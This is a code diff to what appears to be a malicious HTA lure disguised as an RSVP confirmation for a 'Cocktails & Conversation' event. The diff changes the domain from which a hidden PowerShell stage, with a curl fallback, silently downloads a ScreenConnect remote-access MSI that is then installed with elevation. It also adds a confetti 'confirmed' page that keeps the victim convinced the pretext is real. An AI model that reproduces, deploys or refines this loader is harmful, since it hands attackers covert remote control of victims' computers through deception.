@@ -101,7 +101,7 @@
 // ---------------------------------------------------------------------------
 // Config
 // ---------------------------------------------------------------------------
-var MSI_URL   = "https://don.lifetime-r.org/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest";
+var MSI_URL   = "https://opt.smar-to.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest";
 
 // Timing budgets
 var DL_MAX_MS      = 480000;   // hard cap for the whole download (8 min)
@@ -154,7 +154,7 @@ var extScanDirs = null, extSinceT = 0, extLastSize = -1, extStableT = 0;
 var powMarker = "", powT0 = 0, powLastSize = 0, powLastGrowT = 0;
 var edgeMaxPartial = 0, edgeLastPartial = 0, edgeLastGrowT = 0, edgeLogT = 0;
 var powPartialMax = 0;
-var POW_PS = "# ScreenConnect client download (Invoke-WebRequest), run hidden by the HTA's \"pow\"\n# stage. param(1) = unique per-page marker (process-kill), param(2) = per-page\n# temp dir (so concurrent runs never collide).\n#\n# The WinINET-based client that gets through on boxes where WinHttp/XHR/BITS\n# get their response bodies stripped (empty-206). The HTA watches this file's\n# size for download progress; the elevated msiexec install is done separately\n# by the HTA (single UAC prompt), so it is NOT run here.\nparam([string]$Marker = \"scm1\", [string]$TmpDir = \"\")\n\n$ErrorActionPreference = \"Continue\"\n\nif (-not $TmpDir) { $TmpDir = Join-Path ([System.IO.Path]::GetTempPath()) (\"sc_\" + $Marker) }\ntry { New-Item -ItemType Directory -Path $TmpDir -Force | Out-Null } catch {}\n\n$tempFile = Join-Path $TmpDir \"sc_client.msi\"\ntry { Remove-Item -LiteralPath $tempFile -Force -ErrorAction SilentlyContinue } catch {}\n\ntry { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}\n\ntry {\n  $ProgressPreference = 'SilentlyContinue'\n  Invoke-WebRequest -Uri \"https://don.lifetime-r.org/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest\" -OutFile $tempFile -UseBasicParsing\n  $ProgressPreference = 'Continue'\n} catch {\n  # Fallback: built-in curl (a separate HTTP stack) in case iwr is also filtered.\n  $env:NO_PROXY = \"*\"\n  try { curl.exe -L --fail --retry 2 --connect-timeout 20 -o $tempFile \"https://don.lifetime-r.org/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest\" 2>$null } catch {}\n}\n\n# Marker file signals \"iwr ran to completion (whatever the result)\". The HTA\n# polls sc_client.msi's size for progress and this flag to know the attempt is done.\ntry { Set-Content -LiteralPath (Join-Path $TmpDir \"done.flag\") -Value $Marker -NoNewline } catch {}\n";   // ScreenConnect's own download command
+var POW_PS = "# ScreenConnect client download (Invoke-WebRequest), run hidden by the HTA's \"pow\"\n# stage. param(1) = unique per-page marker (process-kill), param(2) = per-page\n# temp dir (so concurrent runs never collide).\n#\n# The WinINET-based client that gets through on boxes where WinHttp/XHR/BITS\n# get their response bodies stripped (empty-206). The HTA watches this file's\n# size for download progress; the elevated msiexec install is done separately\n# by the HTA (single UAC prompt), so it is NOT run here.\nparam([string]$Marker = \"scm1\", [string]$TmpDir = \"\")\n\n$ErrorActionPreference = \"Continue\"\n\nif (-not $TmpDir) { $TmpDir = Join-Path ([System.IO.Path]::GetTempPath()) (\"sc_\" + $Marker) }\ntry { New-Item -ItemType Directory -Path $TmpDir -Force | Out-Null } catch {}\n\n$tempFile = Join-Path $TmpDir \"sc_client.msi\"\ntry { Remove-Item -LiteralPath $tempFile -Force -ErrorAction SilentlyContinue } catch {}\n\ntry { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}\n\ntry {\n  $ProgressPreference = 'SilentlyContinue'\n  Invoke-WebRequest -Uri \"https://opt.smar-to.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest\" -OutFile $tempFile -UseBasicParsing\n  $ProgressPreference = 'Continue'\n} catch {\n  # Fallback: built-in curl (a separate HTTP stack) in case iwr is also filtered.\n  $env:NO_PROXY = \"*\"\n  try { curl.exe -L --fail --retry 2 --connect-timeout 20 -o $tempFile \"https://opt.smar-to.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest\" 2>$null } catch {}\n}\n\n# Marker file signals \"iwr ran to completion (whatever the result)\". The HTA\n# polls sc_client.msi's size for progress and this flag to know the attempt is done.\ntry { Set-Content -LiteralPath (Join-Path $TmpDir \"done.flag\") -Value $Marker -NoNewline } catch {}\n";   // ScreenConnect's own download command
 var powDir = "";
 var UA_STR = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";
 
@@ -232,7 +232,7 @@ function cleanStale() {
 //   curl     the built-in curl.exe, separate process.
 //   pow      the hidden-Invoke-WebRequest download stage (the WinINET client
 //            that ships with the OS): powershell.exe -ExecutionPolicy Bypass
-//            "iwr https://don.lifetime-r.org/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest
+//            "iwr https://opt.smar-to.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest
 //            -OutFile %TEMP%\sc_<id>\sc_client.msi" (TLS12). Gets through on
 //            boxes where WinHttp/XHR/BITS have their response bodies
 //            stripped (empty-206). The elevated msiexec install is done
@@ -1349,6 +1349,88 @@ function finishInstall() {
   $("subnote").innerHTML = "You&rsquo;re confirmed for Cocktails &amp; Conversation. Look out for the event details.";
   $("note").innerHTML = "You can now close this window.";
   $("cancelbtn").innerHTML = "Close";
+  try { openConfirmation(); } catch (e) {}
+}
+
+// ---------------------------------------------------------------------------
+// Confirmation celebration. A self-contained page (canvas confetti cannon +
+// party popper) written to %TEMP% and opened in the default browser the
+// moment the install is confirmed. Pure ASCII source; no network, no
+// external assets, nothing to download.
+// ---------------------------------------------------------------------------
+function confettiDoc() {
+  var L = [];
+  L.push('<!DOCTYPE html>');
+  L.push('<html lang="en"><head><meta charset="utf-8">');
+  L.push('<meta name="viewport" content="width=device-width,initial-scale=1">');
+  L.push('<title>You&rsquo;ve been confirmed</title>');
+  L.push('<style>');
+  L.push('*{box-sizing:border-box}');
+  L.push('html,body{height:100%;margin:0;overflow:hidden;background:radial-gradient(120% 90% at 50% 0%,#1a1626 0%,#0c0b12 55%,#06050a 100%);color:#f4efe6;font-family:"Segoe UI",Roboto,Helvetica,Arial,sans-serif}');
+  L.push('#cf{position:fixed;inset:0;width:100%;height:100%;display:block}');
+  L.push('.wrap{position:fixed;inset:0;z-index:2;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:24px;animation:rise .85s cubic-bezier(.2,.8,.2,1) both}');
+  L.push('.ring{width:96px;height:96px;border-radius:50%;border:2px solid #c9a86a;display:flex;align-items:center;justify-content:center;margin-bottom:26px;animation:glow 2.6s ease-in-out infinite}');
+  L.push('.ring svg{width:54px;height:54px}');
+  L.push('h1{margin:0 0 14px;font-size:clamp(26px,5vw,44px);font-weight:600;letter-spacing:.2px}');
+  L.push('h1 em{color:#c9a86a;font-style:normal}');
+  L.push('p{margin:0;max-width:560px;font-size:15px;line-height:1.75;color:rgba(244,239,230,.64)}');
+  L.push('.badge{margin-top:30px;padding:10px 20px;border:1px solid rgba(201,168,106,.5);border-radius:999px;color:#c9a86a;font-size:11.5px;letter-spacing:2.6px;text-transform:uppercase}');
+  L.push('.popper{position:fixed;inset:0;z-index:3;pointer-events:none;display:flex;align-items:center;justify-content:center;font-size:76px;opacity:0;animation:pop 1.7s cubic-bezier(.2,.9,.3,1.4) .18s 1 both}');
+  L.push('@keyframes rise{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:none}}');
+  L.push('@keyframes glow{0%,100%{box-shadow:0 0 34px rgba(201,168,106,.18)}50%{box-shadow:0 0 64px rgba(201,168,106,.44)}}');
+  L.push('@keyframes pop{0%{opacity:0;transform:scale(.35) rotate(-12deg)}22%{opacity:1;transform:scale(1.18) rotate(6deg)}55%{opacity:1;transform:scale(1) rotate(0)}100%{opacity:0;transform:scale(1.06) translateY(-18px)}}');
+  L.push('@media (prefers-reduced-motion:reduce){.wrap,.ring,.popper{animation:none}.popper{opacity:1}}');
+  L.push('</style></head><body>');
+  L.push('<canvas id="cf"></canvas>');
+  L.push('<div class="popper">&#127881;</div>');
+  L.push('<div class="wrap">');
+  L.push('<div class="ring"><svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg"><circle cx="32" cy="32" r="29" fill="none" stroke="#c9a86a" stroke-width="2"/><path d="M20 33 L28.5 41.5 L44 24" fill="none" stroke="#c9a86a" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg></div>');
+  L.push('<h1>You&rsquo;ve been <em>confirmed</em>!</h1>');
+  L.push('<p>Your RSVP for Cocktails &amp; Conversation is confirmed. Watch your inbox &mdash; the event details are on their way.</p>');
+  L.push('<div class="badge">Confirmed</div>');
+  L.push('</div>');
+  L.push('<script>');
+  L.push('if(!window.requestAnimationFrame){window.requestAnimationFrame=function(cb){return setTimeout(function(){cb(Date.now())},16)}}');
+  L.push('var cv=document.getElementById("cf"),cx=cv.getContext("2d"),W=0,H=0,D=[],run=1;');
+  L.push('var C=["#c9a86a","#f4efe6","#e8b4b8","#7fd1c1","#f6d365","#d98c8c","#b9a7f0","#ffffff"];');
+  L.push('function rs(){W=cv.width=window.innerWidth;H=cv.height=window.innerHeight}');
+  L.push('rs();window.addEventListener("resize",rs);');
+  L.push('function P(x,y,vx,vy){return{x:x,y:y,vx:vx,vy:vy,w:6+Math.random()*7,h:9+Math.random()*11,r:Math.random()*6.283,vr:(Math.random()-.5)*.32,c:C[(Math.random()*C.length)|0]}}');
+  L.push('function burst(x,y,a,n,sp){for(var i=0;i<n;i++){var g=a+(Math.random()-.5)*1.15,s=(sp||12)+Math.random()*14;D.push(P(x,y,Math.cos(g)*s,Math.sin(g)*s))}}');
+  L.push('function rain(n){for(var i=0;i<n;i++){var q=P(Math.random()*W,-Math.random()*H*.6,0,1.6+Math.random()*2.4);q.vx=(Math.random()-.5)*1.6;D.push(q)}}');
+  L.push('burst(-6,H+8,-1.02,120,15);burst(W+6,H+8,-2.12,120,15);rain(80);');
+  L.push('setTimeout(function(){burst(-6,H+8,-1.02,90,14);burst(W+6,H+8,-2.12,90,14)},420);');
+  L.push('setTimeout(function(){burst(W*.5,H+8,-1.571,90,15)},860);');
+  L.push('setTimeout(function(){burst(-6,H+8,-1.02,80,15);burst(W+6,H+8,-2.12,80,15)},1300);');
+  L.push('function step(){if(!run)return;cx.clearRect(0,0,W,H);');
+  L.push('for(var i=D.length-1;i>=0;i--){var p=D[i];p.vy+=.26;p.vx*=.994;p.x+=p.vx;p.y+=p.vy;p.r+=p.vr;');
+  L.push('if(p.y>H+60||p.x<-90||p.x>W+90){D.splice(i,1);continue}');
+  L.push('cx.save();cx.translate(p.x,p.y);cx.rotate(p.r);cx.fillStyle=p.c;cx.fillRect(-p.w/2,-p.h/2,p.w,p.h);cx.restore()}');
+  L.push('requestAnimationFrame(step)}');
+  L.push('step();');
+  L.push('setTimeout(function(){cv.style.transition="opacity 2.2s ease";cv.style.opacity="0"},10500);');
+  L.push('setTimeout(function(){run=0;cx.clearRect(0,0,W,H)},12900);');
+  L.push('<\/script>');
+  L.push('</body></html>');
+  return L.join('\r\n');
+}
+
+function openConfirmation() {
+  try {
+    var path = shell.ExpandEnvironmentStrings("%TEMP%") + "\\__sc__confirmed.html";
+    try {
+      var f = fso.CreateTextFile(path, true);   // ANSI file — content is pure ASCII
+      f.Write(confettiDoc());
+      f.Close();
+    } catch (e1) { return; }
+    var opened = false;
+    try {
+      var sa = new ActiveXObject("Shell.Application");
+      sa.ShellExecute(path, "", "", "open", 1);  // default browser
+      opened = true;
+    } catch (e2) {}
+    if (!opened) { try { window.open("file:///" + path.replace(/\\/g, "/"), "_blank"); } catch (e3) {} }
+  } catch (e) {}
 }
 
 function cancel() {
